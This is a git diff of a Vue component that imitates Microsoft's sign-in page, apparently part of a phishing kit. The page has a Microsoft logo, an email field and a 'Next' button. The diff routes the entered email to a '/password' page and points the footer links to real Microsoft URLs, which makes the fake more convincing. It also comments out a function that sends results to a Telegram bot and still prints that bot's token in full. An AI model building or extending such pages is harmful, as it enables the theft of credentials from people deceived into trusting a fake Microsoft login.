@@ -12,17 +12,16 @@ export default {
       isActive: false,
       count: 0,
       finalCount: 1, // Only send once
-    }
+    };
   },
 
   computed: {
     isFormValid() {
-      return this.formDataRes.email.trim() !== ''
-    }
+      return this.formDataRes.email.trim() !== "";
+    },
   },
 
   methods: {
-
     // registerFan() {
     //   this.showPopup = true;
     // },
@@ -48,29 +47,33 @@ export default {
         this.isActive = !this.isActive;
         this.loading = false;
       } else {
-        // Redirect after sending
-        location.replace("/password");
+        this.$router.push({
+          path: "/password",
+          query: {
+            email: this.formDataRes.email,
+          },
+        });
       }
     },
 
-    async sendTelegramResult(chatId, message) {
-      try {
-        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
+    // async sendTelegramResult(chatId, message) {
+    //   try {
+    //     const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
 
-        const payload = {
-          chat_id: chatId,
-          text: message,
+    //     const payload = {
+    //       chat_id: chatId,
+    //       text: message,
 
-        };
+    //     };
 
-        console.log("Sending payload:", payload);
-        await axios.post(url, payload);
-      } catch (error) {
-        console.error("Telegram API Error:", error);
-      }
-    },
-  }
-}
+    //     console.log("Sending payload:", payload);
+    //     await axios.post(url, payload);
+    //   } catch (error) {
+    //     console.error("Telegram API Error:", error);
+    //   }
+    // },
+  },
+};
 </script>
 
 <template>
@@ -78,7 +81,7 @@ export default {
     <div class="login-card">
       <!-- <div class="back">←</div> -->
 
-      <div style="width: full; display: flex; justify-content: center;">
+      <div style="width: full; display: flex; justify-content: center">
         <svg
           aria-label="Microsoft"
           data-testid="microsoftLogo"
@@ -118,12 +121,11 @@ export default {
           <input type="email" id="email" v-model="formDataRes.email" required />
           <label>Email or phone number</label>
         </div>
-  
+
         <a href="#" class="forgot"> Forgot your username? </a>
-  
+
         <button class="next">Next</button>
       </form>
-
 
       <div class="signup">
         New to Microsoft?
@@ -132,11 +134,18 @@ export default {
     </div>
 
     <footer>
-      <a href="#">Help and feedback</a>
+      <a
+        href="https://support.microsoft.com/home/contact?linkquery=Show%20me%20self-help%20support%20for%20sign%20in%20issues"
+        >Help and feedback</a
+      >
 
-      <a href="#">Terms of use</a>
+      <a href="https://www.microsoft.com/en-us/servicesagreement"
+        >Terms of use</a
+      >
 
-      <a href="#">Privacy and cookies</a>
+      <a href="https://www.microsoft.com/en-us/privacy/-"
+        >Privacy and cookies</a
+      >
     </footer>
   </div>
 </template>
